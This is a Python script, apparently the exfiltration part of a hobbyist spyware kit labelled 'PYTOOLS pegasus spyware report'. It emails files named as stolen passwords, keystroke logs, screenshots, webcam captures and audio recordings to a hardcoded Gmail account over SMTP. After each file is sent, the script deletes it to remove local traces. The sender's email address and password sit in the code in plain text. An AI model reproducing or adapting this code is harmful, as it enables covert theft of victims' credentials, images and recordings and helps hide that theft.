import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

def send_mail(attach_file_name):
    mail_content = '''PYTOOLS pegasus spyware report'''
    #The mail addresses and password
    sender_address = 'jadujack011@gmail.com'
    sender_pass = 'jadu@123'
    receiver_address = 'jadujack011@gmail.com'
    #Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'files attach'
    #The subject line
    #The body and the attachments for the mail
    message.attach(MIMEText(mail_content, 'plain'))
    attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload) #encode the attachment
    #add payload header with filename
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)
    #Create SMTP session for sending the mail
    session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
    session.starttls() #enable security
    session.login(sender_address, sender_pass) #login with mail_id and password
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Mail Sent')


def delete_file(file):
    os.remove(file)

files = ['saved_password.txt','log.txt','screenshot.png','capture_img.png','recording0.wav']

for i in files :
    send_mail(i)
    delete_file(i)
